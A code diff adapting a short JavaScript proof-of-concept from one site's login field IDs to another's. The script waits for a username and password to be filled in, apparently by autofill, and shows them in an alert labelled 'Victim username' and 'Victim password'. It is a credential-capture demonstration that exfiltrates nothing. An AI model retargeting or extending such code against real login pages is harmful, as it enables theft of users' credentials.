@@ -1,16 +1,16 @@
 let isFilled = false;
 
  function checkInputs() {
-    const input1 = document.getElementById('signin-email');
-    const input2 = document.getElementById('signin-password');
+    const input1 = document.getElementsByName('uname')[0];
+    const input2 = document.getElementById('account_pwd');
 
     if (input1.value && input2.value) {
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          alert("Victim's email: "+document.getElementsByName('logonId')[0].value+"\nVictim's Password:"+document.getElementsByName('logonPassword')[0].value);
+          alert('Victim username: '+document.getElementsByName('uname')[0].value+'\n\nVictim password: '+document.getElementById('account_pwd').value);
          
-        }, 6500); 
+        }, 7500); 
       }
     }
   }
@@ -19,5 +19,5 @@ let isFilled = false;
   window.onload = checkInputs;
 
 
-  document.getElementById('signin-email').addEventListener('input', checkInputs);
-  document.getElementById('signin-password').addEventListener('input', checkInputs);
+  document.getElementsByName('uname')[0].addEventListener('input', checkInputs);
+  document.getElementById('account_pwd').addEventListener('input', checkInputs);
